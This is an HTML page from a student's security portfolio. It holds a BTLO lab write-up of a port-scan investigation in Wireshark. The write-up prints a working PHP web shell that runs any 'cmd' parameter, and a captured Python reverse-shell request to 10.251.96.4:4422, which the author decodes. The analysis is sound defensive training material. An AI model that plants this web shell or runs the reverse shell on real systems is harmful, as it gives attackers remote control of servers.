@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Nicklas — student aiming for SOC and cloud security. Portfolio and writeups.">
+  <title>Port Scanning (BTLO) — Nicklas</title>
+  <link rel="stylesheet" href="../assets/css/theme.css">
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+  <!--
+  Shared site header.
+  ../ = relative path prefix to the site root ("" or "../").
+  {{ nav_home|projects|writeups|contact }} = optional aria-current="page".
+-->
+<header class="site-header">
+  <div class="site-header__inner">
+    <a class="site-title" href="../">nickaphy</a>
+    <nav class="site-nav" aria-label="Main">
+      <a href="../">Home</a>
+      <a href="../projects/">Projects</a>
+      <a href="../writeups/" aria-current="page">Writeups</a>
+      <a href="../#contact">Contact</a>
+    </nav>
+  </div>
+</header>
+
+  <main class="site-main">
+    <!--
+  Individual writeup page body. build.py fills title/date/tags/body from Markdown
+  frontmatter + rendered HTML, then wraps with base/header/footer.
+  Reading column: .prose (~700px, line-height 1.7).
+-->
+<p class="back-link"><a href="../writeups/">← Back to writeups</a></p>
+
+<article class="prose">
+  <h1>Port Scanning (BTLO)</h1>
+  <div class="meta">
+    <time datetime="2026-09-23">2026-09-23</time>
+    <ul class="tags" aria-label="Tags"><li>cybersecurity</li><li>networking</li><li>btlo</li></ul>
+  </div>
+  <h2>Alert</h2>
+<p>The SOC team received an alert in their SIEM for Local to Local port scanning where an internal private IP began scanning another internal system.</p>
+<h2>Prerequisites</h2>
+<p>The pcap captures every byte of network traffic, which also includes the malware. To isolate and mitigate risk I will be spinning up a Kali-Linux virtual machine to investigate the pcap.</p>
+<ul>
+<li>Wireshark - for network analysis</li>
+<li>Packet Capture - network traffic for investigation</li>
+<li>KaliLinux-VM - For isolated investigation</li>
+</ul>
+<h2>Core Investigation</h2>
+<p>To start off I got notice about the file I were to investigate were infected. This information led me to spinning up my KaliLinux virtual machine and running the investigation through there. My first goal was to identify the IP responsible for port scanning, and I did this by:</p>
+<ul>
+<li>Went to <code>statictics -&gt; conversations -&gt; TCP</code></li>
+<li>The pattern was clear the IP-adress 10.251.96.4 had incrementally made requests to port 1 through 1024. Another clear pattern that confirmed my suspicion, was the size of all the request were 1 packet, which is a deliberate small packet-size with no other purpose than finding open ports.</li>
+</ul>
+<h2>SYN Scan</h2>
+<p>Next up I wanted to identify the type of port scan conducted by the attacker. To do this I started by filtering the network-traffic with <code>tcp.flags.syn==1</code> and <code>tcp.flags.ack==0</code>. This shows me the requests that sent a SYN but never finished actually finished the 3 way handshake with ACK. By this I could clearly see this was a TCP SYN scan, this is often used because it is slightly faster than a full handshake, and older detection methods can overlook this type.</p>
+<h2>Tools used for reconnaissance on open ports</h2>
+<p>To identify which tools were used on the open ports, to do this we will look at User Agent Strings which often leaves a signature of whichever tool it comes from. We use this filter <code>ip.dst == 10.251.96.5 &amp;&amp; http.user_agent</code> this gives us only the requests made to the target IP, and the ones who contains User Agent Strings, from we just take a look at some of the requests and its HTTP information, where it tells us gobuster 3.0.1 and sqlmap 1.4.7 had been used.</p>
+<h2>php file which the attacker uploaded a web shell</h2>
+<p>When information is sent to a website, is it through Http Posts requests. This means the we can filter the traffic by <code>http.request.method==POST</code>, and after some searching we find php mentioned. From the outside we cannot determine the plaintext of the file uploaded which is editprofile.php, if we follow the TCP stream, in that window we can see clearly stated "The file <code>dbfunctions.php</code> has been uploaded".</p>
+<div class="codehilite"><pre><span></span><code>&lt;?php
+if(isset($_REQUEST['cmd']) ){
+echo "&lt;pre&gt;";
+$cmd = ($_REQUEST['cmd']);
+system($cmd);
+echo "&lt;/pre&gt;";
+die;
+}
+?&gt;
+</code></pre></div>
+
+<p>From this file uploaded to act as a webshell we can clearly see that following GET requests to this file, will be executed as commands cmd.</p>
+<h2>Figuring out which commands has been run</h2>
+<p>As we discussed before, all following GET requests from the source IP to the file will be commands. This means if we use this filter <code>ip.src==10.251.96.4 &amp;&amp; http.request.method==GET</code>, to filter the source IP, and its GET requests. Almost immidiately we can see the fist command executed was <code>id</code> with <code>whoami</code> and a pythonscript which we have not yet figured out what does.</p>
+<h2>What type of shell connection</h2>
+<p>We just established which commands had been run, now we need to identify exactly what this mysterious python script does.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">GET</span> <span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">dbfunctions</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">python</span><span class="o">%</span><span class="mi">20</span><span class="o">-</span><span class="n">c</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">27</span><span class="n">import</span><span class="o">%</span><span class="mi">20</span><span class="n">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">%</span><span class="mf">2210.251.96.4</span><span class="o">%</span><span class="mi">22</span><span class="p">,</span><span class="mi">4422</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span><span class="o">%</span><span class="mi">20</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="o">%</span><span class="mi">20</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="o">%</span><span class="mi">22</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">%</span><span class="mi">22</span><span class="p">,</span><span class="o">%</span><span class="mi">22</span><span class="o">-</span><span class="n">i</span><span class="o">%</span><span class="mi">22</span><span class="p">]);</span><span class="o">%</span><span class="mi">27</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+
+<span class="c1"># Decoded script</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span><span class="o">,</span><span class="w"> </span><span class="nn">subprocess</span><span class="o">,</span><span class="w"> </span><span class="nn">os</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c1"># Opens TCP socket</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">"10.251.96.4"</span><span class="p">,</span> <span class="mi">4422</span><span class="p">))</span> <span class="c1"># Connect to IP-adress</span>
+
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># Rewire keyboard-input to point at the socket</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">1</span><span class="p">)</span> <span class="c1"># Rewire screen-output to point at the socket</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># Rewire screen-error-output to point at the socket</span>
+
+<span class="c1"># Spawns interactive shell - I/O bound to socket = attacker's listeners becomes the shell on the host.</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">"/bin/sh"</span><span class="p">,</span> <span class="s2">"-i"</span><span class="p">])</span>
+</code></pre></div>
+
+<p>In short its a reverse shell, that rewires the I/O to the socket, making the attackers listeners act as a shell on the host, and the port he uses for the shell connection is 4422</p>
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <p>&copy; Nicklas — portfolio &amp; security writeups</p>
+  </div>
+</footer>
+<script src="../assets/js/main.js"></script>
+
+</body>
+</html>
